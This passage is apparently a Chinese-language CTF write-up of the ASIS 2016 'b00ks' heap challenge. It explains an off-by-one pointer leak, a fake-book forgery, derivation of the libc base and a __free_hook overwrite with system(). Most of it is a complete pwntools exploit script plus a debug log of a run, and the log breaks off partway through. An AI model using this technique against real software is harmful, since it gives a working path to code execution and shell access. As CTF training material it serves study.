(0x00a51000)</span><br><span class="line"></span><br><span class="line">$ ulimit -s unlimited</span><br><span class="line">$ ldd ./mmap_libc_base_addr32 </span><br><span class="line">linux-gate.so.1 =&gt;  (0x40000000)</span><br><span class="line">libc.so.6 =&gt; /lib/libc.so.6 (0x40015000)</span><br><span class="line">/lib/ld-linux.so.2 (0x00a51000)</span><br><span class="line"></span><br><span class="line">$ ldd ./mmap_libc_base_addr32 </span><br><span class="line">linux-gate.so.1 =&gt;  (0x40000000)</span><br><span class="line">libc.so.6 =&gt; /lib/libc.so.6 (0x40015000)</span><br><span class="line">/lib/ld-linux.so.2 (0x00a51000)</span><br></pre></td></tr></table></figure>
<h1><span id="利用思路">利用思路</span></h1><ol>
<li><p>泄露 book1 结构体堆指针地址。具体步骤</p>
<ol>
<li>author name 输入 32 个字符</li>
<li>选择 1.create book1 </li>
<li><p>选择 4.print book1 struct,”Author: “ field 可泄露出 book1 结构体堆指针</p>
<p>为什么可以泄露 book1 结构体指针呢，这是因为32个字符连着地址，没有结束符 “\x00”</p>
</li>
</ol>
</li>
<li>计算得到要伪造的 fake book addr及偏移量</li>
<li>创建 book2 with 0x21000 的 book2 desc 和 “/bin/sh” 的 book2 name</li>
<li>构造 fake book1。编辑 book1 ，实际就是对 book1 desc 写入数据，，fake book1 name 存储着 *book2 desc addr</li>
<li>leak mmap 分配的内存地址。print fake book,泄露 book2 desc addr,由此推算出 libc base addr ，然后再计算出 system addr , /bin/sh , __free_hook 的地址</li>
<li>覆写 free hook。分两步，先修改 fake book desc 存储的指针为 free book 的地址；然后修改 book2 desc ，改写 __free_hook 存储的地址为 system 地址</li>
<li>执行 shell。delete book2, free book2 name 的时候执行的就是 system(book2 name)</li>
</ol>
<h1><span id="内存管理器-hook-机制">内存管理器 Hook 机制</span></h1><p>在 Linux 下，内存管理器一般通过 HOOK 来实现自定义的malloc函数，具体就是通过覆盖 hook 函数指针来实现。glibc 提供四个全局函数 hook 指针</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__malloc_hook</span><br><span class="line">__realloc_hook</span><br><span class="line">__free_hook</span><br><span class="line">__memalign_hook</span><br></pre></td></tr></table></figure>
<p>所以像 jemalloc 或者 tcmalloc 等堆管理器通过覆盖这些 hook 函数指针使程序调用到它们自定义的malloc。当然在漏洞利用的时候也常被用来覆写为 system() 等地址。</p>
<p>所以在这里，既然不可以覆写 got 表，那么就覆写 __free_hook 函数地址。</p>
<h1><span id="脚本及-getshell">脚本及 getshell</span></h1><p>以下脚本在 ASLR == 0 或 1 时可 getshell,在开启 ASLR == 2 时一定几率可 getshell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-* encoding:utf-8 *-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_book</span><span class="params">(target, name_size, book_name, desc_size, book_desc)</span>:</span></span><br><span class="line">	target.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">	target.sendline(<span class="string">'1'</span>)</span><br><span class="line">	target.sendlineafter(<span class="string">'Enter book name size: '</span>, str(name_size))</span><br><span class="line">	target.sendlineafter(<span class="string">'Enter book name (Max 32 chars): '</span>, book_name)</span><br><span class="line">	target.sendlineafter(<span class="string">'Enter book description size: '</span>, str(desc_size))</span><br><span class="line">	target.sendlineafter(<span class="string">'Enter book description: '</span>, book_desc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_author</span><span class="params">(p)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">	p.sendline(<span class="string">"5"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Enter author name: "</span>)</span><br><span class="line">	p.sendline(<span class="string">"a"</span>*<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_book1</span><span class="params">(target)</span>:</span></span><br><span class="line">	target.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">	target.sendline(<span class="string">"4"</span>)</span><br><span class="line">	target.recvuntil(<span class="string">"Author: "</span>)</span><br><span class="line">	author_msg = target.recvline()</span><br><span class="line">	msg = author_msg.split(<span class="string">"A"</span> * <span class="number">32</span>)[<span class="number">1</span>]</span><br><span class="line">	msg = msg.split(<span class="string">"\n"</span>)[<span class="number">0</span>]</span><br><span class="line">	context.bits = len(msg) * <span class="number">8</span></span><br><span class="line">	addr = unpack(msg)</span><br><span class="line">	log.success(<span class="string">"Leaked address of book1 struct object : "</span> + hex(addr))</span><br><span class="line">	<span class="comment"># context.bits = 64</span></span><br><span class="line">	<span class="comment"># log.info(addr)</span></span><br><span class="line">	<span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_book</span><span class="params">(p,bookid,book_desc)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">	p.sendline(<span class="string">"3"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Enter the book id you want to edit: "</span>)</span><br><span class="line">	p.sendline(str(bookid))</span><br><span class="line">	p.recvuntil(<span class="string">"Enter new book description: "</span>)</span><br><span class="line">	p.sendline(book_desc)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_mmap</span><span class="params">(p)</span>:</span></span><br><span class="line">	log.info(<span class="string">"[+] Leak mmap-libc offset"</span>)</span><br><span class="line">	log.info(p.recvuntil(<span class="string">"&gt; "</span>))</span><br><span class="line">	p.sendline(<span class="string">"4"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Name: "</span>)</span><br><span class="line">	mmap_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">	<span class="comment"># p.recvuntil("Exit")</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">"[+]mmap_addr:"</span>,hex(mmap_addr)</span><br><span class="line">	<span class="keyword">return</span> mmap_addr</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./b00ks"</span>)</span><br><span class="line">mmap_offset = <span class="number">0x1ca010</span></span><br><span class="line"><span class="comment"># mmap_offset = 0x1eb000</span></span><br><span class="line">g_offset = <span class="number">0x202040</span></span><br><span class="line">libc = ELF(<span class="string">"./libc-2.27.so"</span>)</span><br><span class="line"><span class="comment"># libc = ELF("./libc-2.24.so")</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">	<span class="comment"># 1.leak book1 heap addr</span></span><br><span class="line">	p.recvuntil(<span class="string">"Enter author name: "</span>)</span><br><span class="line">	p.sendline(<span class="string">"A"</span> * <span class="number">0x20</span>)</span><br><span class="line">	create_book(p, <span class="number">20</span>, <span class="string">"book1"</span>, <span class="number">220</span>, <span class="string">"book1 des"</span>)</span><br><span class="line">	<span class="comment"># 2.find fake1 addr and offset</span></span><br><span class="line">	book1_addr = leak_book1(p)</span><br><span class="line">	fake_addr = book1_addr - ord(p64(book1_addr)[<span class="number">0</span>])</span><br><span class="line">	padding_size = <span class="number">0x110</span> - ord(p64(book1_addr)[<span class="number">0</span>]) - <span class="number">0x20</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">"[+] fake_addr:"</span>,hex(fake_addr)</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"[+] padding size:"</span>,hex(padding_size)</span><br><span class="line">	<span class="comment"># 3.create book2 with 0x21000 book description</span></span><br><span class="line">	create_book(p,<span class="number">20</span>,<span class="string">"/bin/sh\x00"</span>,<span class="number">0x21000</span>,<span class="string">"book2 des"</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 4.fake book1</span></span><br><span class="line">	book2_addr = book1_addr + <span class="number">0x30</span> + <span class="number">0x20</span></span><br><span class="line">	payload1 = <span class="string">"0"</span>*padding_size + p64(<span class="number">1</span>) + p64(book2_addr + <span class="number">0x10</span>) + p64(book2_addr + <span class="number">0x10</span>) + pack(<span class="number">0xffff</span>)</span><br><span class="line">	edit_book(p,<span class="number">1</span>,payload1)</span><br><span class="line">	change_author(p)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 5.leak mmap addr</span></span><br><span class="line">	mmap_addr = leak_mmap(p)</span><br><span class="line">	libc_base = mmap_addr - mmap_offset</span><br><span class="line">	system_addr = libc_base + libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">	binsh_addr = libc_base + next(libc.search(<span class="string">"/bin/sh\x00"</span>))</span><br><span class="line">	free_hook = libc_base + libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"system addr:"</span>,hex(system_addr)</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"binsh addr:"</span>,hex(binsh_addr)</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"__free_hook:"</span>,hex(free_hook)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 6.overwrite __free_hook</span></span><br><span class="line">	payload2 = p64(free_hook)</span><br><span class="line">	payload3 = p64(system_addr)</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"[+]overwrite free hook"</span></span><br><span class="line">	<span class="keyword">print</span> proc.pidof(p)[<span class="number">0</span>]</span><br><span class="line">	edit_book(p,<span class="number">1</span>,payload2)</span><br><span class="line">	sleep(<span class="number">3</span>)</span><br><span class="line">	<span class="comment"># gdb.attach(p)</span></span><br><span class="line">	edit_book(p,<span class="number">2</span>,payload3)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 7.exec shell</span></span><br><span class="line">	p.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">	p.sendline(<span class="string">"2"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Enter the book id you want to delete: "</span>)</span><br><span class="line">	p.sendline(<span class="string">"2"</span>)</span><br><span class="line">	p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$python ./b00ks_pwn.py DEBUG</span><br><span class="line">[+] Starting local process <span class="string">'./b00ks'</span>: pid <span class="number">5215</span></span><br><span class="line">[DEBUG] PLT <span class="number">0x22050</span> realloc</span><br><span class="line">[DEBUG] PLT <span class="number">0x22090</span> __tls_get_addr</span><br><span class="line">[DEBUG] PLT <span class="number">0x220d0</span> memalign</span><br><span class="line">[DEBUG] PLT <span class="number">0x220e0</span> _dl_exception_create</span><br><span class="line">[DEBUG] PLT <span class="number">0x22120</span> __tunable_get_val</span><br><span class="line">[DEBUG] PLT <span class="number">0x221d0</span> _dl_find_dso_for_object</span><br><span class="line">[DEBUG] PLT <span class="number">0x22210</span> calloc</span><br><span class="line">[DEBUG] PLT <span class="number">0x222f0</span> malloc</span><br><span class="line">[DEBUG] PLT <span class="number">0x222f8</span> free</span><br><span class="line">[*] <span class="string">'/media/sf_workplace/CTF/asis2016/b00ks/libc-2.27.so'</span></span><br><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">[DEBUG] Received <span class="number">0x33</span> bytes:</span><br><span class="line"><span class="string">'Welcome to ASISCTF book library\n'</span></span><br><span class="line"><span class="string">'Enter author name: '</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x21</span> bytes:</span><br><span class="line"><span class="string">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x6f</span> bytes:</span><br><span class="line"><span class="string">'\n'</span></span><br><span class="line"><span class="string">'1. Create a book\n'</span></span><br><span class="line"><span class="string">'2. Delete a book\n'</span></span><br><span class="line"><span class="string">'3. Edit a book\n'</span></span><br><span class="line"><span class="string">'4. Print book detail\n'</span></span><br><span class="line"><span class="string">'5. Change current author name\n'</span></span><br><span class="line"><span class="string">'6. Exit\n'</span></span><br><span class="line"><span class="string">'&gt; '</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'1\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x17</span> bytes:</span><br><span class="line"><span class="string">'\n'</span></span><br><span class="line"><span class="string">'Enter book name size: '</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x3</span> bytes:</span><br><span class="line"><span class="string">'20\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x20</span> bytes:</span><br><span class="line"><span class="string">'Enter book name (Max 32 chars): '</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x6</span> bytes:</span><br><span class="line"><span class="string">'book1\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x1e</span> bytes:</span><br><span class="line"><span class="string">'\n'</span></span><br><span class="line"><span class="string">'Enter book description size: '</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x4</span> bytes:</span><br><span class="line"><span class="string">'220\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x18</span> bytes:</span><br><span class="line"><span class="string">'Enter book description: '</span></span><br><span class="line">[DEBUG] Sent <span class="number">0xa</span> bytes:</span><br><span class="line"><span class="string">'book1 des\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x6f</span> bytes:</span><br><span class="line"><span class="string">'\n'</span></span><br><span class="line"><span class="string">'1. Create a book\n'</span></span><br><span class="line"><span class="string">'2. Delete a book\n'</span></span><br><span class="line"><span class="string">'3. Edit a book\n'</span></span><br><span class="line"><span class="string">'4. Print book detail\n'</span></span><br><span class="line"><span class="string">'5. Change current author name\n'</span></span><br><span class="line"><span class="string">'6. Exit\n'</span></span><br><span class="line"><span class="string">'&gt; '</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'4\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0xc7</span> bytes:</span><br><span class="line"><span class="number">00000000</span>  <span class="number">49</span> <span class="number">44</span> <span class="number">3</span>a <span class="number">20</span>  <span class="number">31</span> <span class="number">0</span>a <span class="number">4</span>e <span class="number">61</span>  <span class="number">6</span>d <span class="number">65</span> <span class="number">3</span>a <span class="number">20</span>  <span class="number">62</span> <span class="number">6</span>f <span class="number">6</span>f <span class="number">6</span>b  |ID: |<span class="number">1</span>·Na|me: |book|</span><br><span class="line"><span class="number">00000010</span>  <span class="number">31</span> <span class="number">0</span>a <span class="number">44</span> <span class="number">65</span>  <span class="number">73</span> <span class="number">63</span> <span class="number">72</span> <span class="number">69</span>  <span class="number">70</span> <span class="number">74</span> <span class="number">69</span> <span class="number">6</span>f  <span class="number">6</span>e <span class="number">3</span>a <span class="number">20</span> <span class="number">62</span>  |<span class="number">1</span>·De|scri|ptio|n: b|</span><br><span class="line"><span class="number">00000020</span>  <span class="number">6</span>f <span class="number">6</span>f <span class="number">6</span>b <span class="number">31</span>  <span class="number">20</span> <span class="number">64</span> <span class="number">65</span> <span class="number">73</span>  <span class="number">0</span>a <span class="number">41</span> <span class="number">75</span> <span class="number">74</span>  <span class="number">68</span> <span class="number">6</span>f <span class="number">72</span> <span class="number">3</span>a  |ook1| des|·Aut|hor:|</span><br><span class="line"><span class="number">00000030</span>  <span class="number">20</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span>  <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span>  <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span>  <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span>  | AAA|AAAA|AAAA|AAAA|</span><br><span class="line"><span class="number">00000040</span>  <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span>  <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span>  <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span>  <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span>  |AAAA|AAAA|AAAA|AAAA|</span><br><span class="line"><span class="number">00000050</span>  <span class="number">41</span> <span class="number">80</span> <span class="number">83</span> <span class="number">75</span>  <span class="number">55</span> <span class="number">55</span> <span class="number">55</span> <span class="number">0</span>a  <span class="number">0</span>a <span class="number">31</span> <span class="number">2</span>e <span class="number">20</span>  <span class="number">43</span> <span class="number">72</span> <span class="number">65</span> <span class="number">61</span>  |A··u|UUU·|·<span class="number">1.</span> |Crea|</span><br><span class="line"><span class="number">00000060</span>  <span class="number">74</span> <span class="number">65</span> <span class="number">20</span> <span class="number">61</span>  <span class="number">20</span> <span class="number">62</span> <span class="number">6</span>f <span class="number">6</span>f  <span class="number">6</span>b <span class="number">0</span>a <span class="number">32</span> <span class="number">2</span>e  <span class="number">20</span> <span class="number">44</span> <span class="number">65</span> <span class="number">6</span>c  |te a| boo|k·<span class="number">2.</span>| Del|</span><br><span class="line"><span class="number">00000070</span>  <span class="number">65</span> <span class="number">74</span> <span class="number">65</span> <span class="number">20</span>  <span class="number">61</span> <span class="number">20</span> <span class="number">62</span> <span class="number">6</span>f  <span class="number">6</span>f <span class="number">6</span>b <span class="number">0</span>a <span class="number">33</span>  <span class="number">2</span>e <span class="number">20</span> <span class="number">45</span> <span class="number">64</span>  |ete |a bo|ok·<span class="number">3</span>|. Ed|</span><br><span class="line"><span class="number">00000080</span>  <span class="number">69</span> <span class="number">74</span> <span class="number">20</span> <span class="number">61</span>  <span class="number">20</span> <span class="number">62</span> <span class="number">6</span>f <span class="number">6</span>f  <span class="number">6</span>b <span class="number">0</span>a <span class="number">34</span> <span class="number">2</span>e  <span class="number">20</span> <span class="number">50</span> <span class="number">72</span> <span class="number">69</span>  |it a| boo|k·<span class="number">4.</span>| Pri|</span><br><span class="line"><span class="number">00000090</span>  <span class="number">6</span>e <span class="number">74</span> <span class="number">20</span> <span class="number">62</span>  <span class="number">6</span>f <span class="number">6</span>f <span class="number">6</span>b <span class="number">20</span>  <span class="number">64</span> <span class="number">65</span> <span class="number">74</span> <span class="number">61</span>  <span class="number">69</span> <span class="number">6</span>c <span class="number">0</span>a <span class="number">35</span>  |nt b|ook |deta|il·<span class="number">5</span>|</span><br><span class="line"><span class="number">000000</span>a0  <span class="number">2</span>e <span class="number">20</span> <span class="number">43</span> <span class="number">68</span>  <span class="number">61</span> <span class="number">6</span>e <span class="number">67</span> <span class="number">65</span>  <span class="number">20</span> <span class="number">63</span> <span class="number">75</span> <span class="number">72</span>  <span class="number">72</span> <span class="number">65</span> <span class="number">6</span>e <span class="number">74</span>  |. Ch|ange| cur|rent|</span><br><span class="line"><span class="number">000000</span>b0  <span class="number">20</span> <span class="number">61</span> <span class="number">75</span> <span class="number">74</span>  <span class="number">68</span> <span class="number">6</span>f <span class="number">72</span> <span class="number">20</span>  <span class="number">6</span>e <span class="number">61</span> <span class="number">6</span>d <span class="number">65</span>  <span class="number">0</span>a <span class="number">36</span> <span class="number">2</span>e <span class="number">20</span>  | aut|hor |name|·<span class="number">6.</span> |</span><br><span class="line"><span class="number">000000</span>c0  <span class="number">45</span> <span class="number">78</span> <span class="number">69</span> <span class="number">74</span>  <span class="number">0</span>a <span class="number">3</span>e <span class="number">20</span>                               |Exit|·&gt; |</span><br><span class="line"><span class="number">000000</span>c7</span><br><span class="line">[+] Leaked address of book1 struct object : <span class="number">0x555555758380</span></span><br><span class="line">[+] fake_addr: <span class="number">0x555555758300</span></span><br><span class="line">[+] padding size: <span class="number">0x70</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'1\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x17</span> bytes:</span><br><span class="line"><span class="string">'\n'</span></span><br><span class="line"><span class="string">'Enter book name size: '</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x3</span> bytes:</span><br><span class="line"><span class="string">'20\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x20</span> bytes:</span><br><span class="line"><span class="string">'Enter book name (Max 32 chars): '</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x9</span> bytes:</span><br><span class="line"><span class="number">00000000</span>  <span class="number">2</span>f <span class="number">62</span> <span class="number">69</span> <span class="number">6</span>e  <span class="number">2</span>f <span class="number">73</span> <span class="number">68</span> <span class="number">00</span>  <span class="number">0</span>a                        |/bin|/sh·|·|</span><br><span class="line"><span class="number">00000009</span></span><br><span class="line">[DEBUG] Received <span class="number">0x1e</span> bytes:</span><br><span class="line"><span class="string">'\n'</span></span><br><span class="line"><span class="string">'Enter book description size: '</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x7</span> bytes:</span><br><span class="line"><span class="string">'135168\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x18</span> bytes:</span><br><span class="line"><span class="string">'Enter book description: '</span></span><br><span class="line">[DEBUG] Sent <span class="number">0xa</span> bytes:</span><br><span class="line"><span class="string">'book2 des\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x6f</span> bytes:</span><br><span class="line"><span class="string">'\n'</span></span><br><span class="line"><span class="string">'1. Create a book\n'</span></span><br><span class="line"><span class="string">'2. Delete a book\n'</span></span><br><span class="line"><span class="string">'3. Edit a book\n'</span></span><br><span class="line"><span class="string">'4. Print book detail\n'</span></span><br><span class="line"><span class="string">'5. Change current author name\n'</span></span><br><span class="line"><span class="string">'6. Exit\n'</span></span><br><span class="line"><span class="string">'&gt; '</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'3\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x24</span> bytes:</span><br><span class="line"><span class="string">'Enter the book id you want to edit: '</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'1\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x1c</span> bytes:</span><br><span class="line"><span class="string">'Enter 